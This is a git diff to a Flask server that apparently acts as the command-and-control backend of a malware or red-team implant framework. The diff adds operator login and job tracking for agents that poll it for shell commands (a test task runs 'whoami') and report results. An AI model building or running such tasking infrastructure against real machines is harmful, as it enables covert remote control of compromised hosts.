@@ -1,4 +1,6 @@
-from flask import Flask , request, jsonify, redirect, render_template, url_for
+from flask import Flask , request, jsonify, redirect, render_template, url_for, session
+import flask_login
+from flask_login import LoginManager, login_required, login_user
 from flask_sqlalchemy import SQLAlchemy ## inherently handles syncronization for us ##
 from sqlalchemy import Column, Integer, String, ForeignKey, Table, false
 import hashlib
@@ -21,6 +23,7 @@ sqlite:////absolute_path/test.db (abs path file-based database)
 password = "ch0nky" # a temperary password to test the server
 localhost = "http://127.0.0.1:5000"
 template_dir = "../client/templates"
+app_secret_key = os.urandom(24)
 # -----------------------------
 
 
@@ -30,6 +33,9 @@ template_dir = "../client/templates"
 ### set up flask app ###
 
 app = Flask(__name__, template_folder=template_dir) # use this to generate routes and handlers
+app.secret_key = app_secret_key
+login_manager = LoginManager()
+login_manager.init_app(app)
 app.config['JSONIFY_PRETTYPRINT_REGULAR'] = True    # makes json output more readab;e
 
 # set the database to work with flask ###
@@ -41,6 +47,7 @@ db = SQLAlchemy(app)
 
 # -----------------------------
 
+
 # 3 statuses for a task
 CREATED = "CREATED"
 TASKED = 'TASKED'
@@ -50,17 +57,19 @@ class Task(db.Model): # a SQLAlchemy class
     id = db.Column(db.Integer, primary_key=True) ## a database entity that allows us to index the entries
     # need to specify length of String if using MySQL; Feel free to change the length
     job_id = db.Column(db.String(288))
+    agent_id = db.Column(db.String(288)) ## the agent that is associated with the task
     command_type = db.Column(db.String(288))
     cmd = db.Column(db.String(4096))
-    status = db.Column(db.String(288))
-    agent_id = db.Column(db.String(288)) ## the agent that is associated with the task
+    job_status = db.Column(db.String(288))
 
 
-class Client(db.Model):
+
+class Client(db.Model, flask_login.UserMixin):
     id = db.Column(db.Integer, primary_key=True)
     client_id = db.Column(db.String(288))
     password = db.Column(db.String(288))
     # implants = db.relationship("Agent", backref='agent', lazy=True)
+
 
 class Agent(db.Model): 
     id               = db.Column(db.Integer, primary_key = True)
@@ -105,11 +114,23 @@ def find_client_by_id(id_):
     """
     return Client.query.filter_by(client_id=id_).first()
 
+def client_exist(id_):
+    """
+        a function that checks if a client exists
+    """
+    return find_client_by_id(id_) != None
+
 def find_agent_task(agent_id):
     """
         a function that finds a task for an agent
     """
-    return Task.query.filter_by(agent_id=agent_id).first()
+    return Task.query.filter_by(agent_id=agent_id, job_status= CREATED).first()
+
+def find_task_by_jobID(job_id):
+    """
+        a function that finds a task by its job_id
+    """
+    return Task.query.filter_by(job_id=job_id).first()
 
 def hash_passoword(password):
     """
@@ -160,7 +181,7 @@ def list_tasks():
         a function that returns a list of tasks stored in database
     """
     tasks = Task.query.all()
-    t = [{"agent_id":i.agent_id, "status": i.status, "command_type": i.command_type, "cmd": i.cmd } for i in tasks]
+    t = [{"agent_id":i.agent_id, "job_id": i.job_id, "job_status": i.job_status, "command_type": i.command_type, "cmd": i.cmd } for i in tasks]
     return t
 
 
@@ -200,25 +221,29 @@ def send_task():
     """
     data = request.json ## getting a request from task route
     if data == None:
-        return jsonify({"status": "error: no data"})
+        return jsonify({"status": "no data received from agent"})
 
+    #TODO: need a better way to hide how the agent identifies itself
     agent_id = data["agent_id"] ## need to verify agent_id 
     password = data["password"] ## and password 
     if not agent_exist(agent_id):
-        return jsonify({"status": "error: agent not found"})
+        return jsonify({"status": "agent not found"})
 
     if verify_agent_password(agent_id, password):
         print(f"[+] agent {agent_id} has nothing to do. Give it a job!")
         task = find_agent_task(agent_id) ## find the task for the agent if there is any
 
         ### A DUMMY CMD FOR TESTING PURPOSES ###
-        task = {"command_type": "test_command", "cmd": ["whoami", "ping 8.8.8.8"], "status": "ok"} 
+        # task = {"command_type": "test_command", "cmd": ["whoami", "ping 8.8.8.8"], "status": CREATED} 
         ### COMMENT OUT WHEN TASK MUST BE READ FROM DB ###
 
         if task == None:
-            return jsonify({"status": "no task for this agent at the moment"})
-
-        return jsonify(task)
+            return jsonify({})
+        else:
+            # update the status of task to TASKED
+            task.job_status = TASKED
+            db.session.commit()
+            return jsonify({"job_id": task.job_id,"command_type": task.command_type, "cmd": task.cmd, "status": "ok"})
     else:
         print("[-] the agent has failed to authenticate")
         return jsonify({"status": "authentication failed"})
@@ -236,17 +261,33 @@ def get_results():
     agent_id = data["agent_id"]
     password = data["password"]
     results = data["results"]
+    job_id = data["job_id"]
 
     if verify_agent_password(agent_id, password):
-        print(f"[+] agent {agent_id} has successfully completed the task")
+        print(f"[+] agent {agent_id} has successfully completed the task# {job_id}")
         print(f"[+] here are the results: {results}")
-        agent = find_agent_by_id(agent_id)
+        # agent = find_agent_by_id(agent_id)
+        task = find_task_by_jobID(job_id)
+        if task == None:
+            return jsonify({"status": "task not found"})
+        task.job_status = DONE
+        db.session.commit()
         return jsonify({"status": "ok"})
     else:
         print("[-] the agent has failed to authenticate")
         return jsonify({"status": "authentication failed"})
 
+# -----------------------------
 
+@login_manager.user_loader
+def load_user(user_id):
+    """
+       a required function for flask-login
+    """
+    if not client_exist:
+        return None
+    else:
+        return find_client_by_id(user_id)
 
 @app.route("/", methods=["GET"])
 def login_page():
@@ -265,17 +306,22 @@ def login_client():
         client = Client(client_id=client_id, password=hash_passoword(client_password))
         db.session.add(client)
         db.session.commit()
-
-        #TODO: need to change this part so that password is properly verified
-        if verify_client_password(client_id, client_password):
-            print(f"[+] a new client has successfully registered: {client.client_id}")
-            return redirect(url_for("dashboard")) # redirect to the home page
-        else:
-            print("[-] authentication failed")
-            return jsonify({"status": "authentication failed"})
     except:
-        print("[-] fail to get info from webpage")
+        print("[-] failed to get info from webpage")
         return render_template("unauthorized.html")
+
+    #TODO: need to change this part so that password is properly verified
+    if verify_client_password(client_id, client_password):
+        print(f"[+] a new client has successfully registered: {client.client_id}")
+        # flask.flash(f"Welcome {client.client_id}!")
+        client = find_client_by_id(client_id)
+        client.authenticated = True
+        login_user(client) ## user loader function from flask-login
+
+        return redirect(url_for("dashboard")) # redirect to the home page
+    else:
+        print("[-] authentication failed")
+        return jsonify({"status": "authentication failed"})
     
     ## check userID and password
     ## if correct, grant access to home page
@@ -283,6 +329,7 @@ def login_client():
     return ""
 
 @app.route('/client/dashboard', methods=['GET'])
+@login_required
 def dashboard():
     #TODO: display all the info needed
     """
@@ -298,6 +345,12 @@ def dashboard():
                     "tasks": task_list})
     
     return info
+
+@app.route('/client/logout', methods=['GET'])
+@login_required
+def logout():
+    pass
+
 
 @app.route("/tasks/create", methods=["POST"])
 def create_task():
@@ -319,7 +372,7 @@ def create_task():
     task = Task(
         command_type=command_type,
         cmd=cmd,
-        status=CREATED,
+        job_status=CREATED,
         agent_id=agent_id,
         job_id=job_id
     )
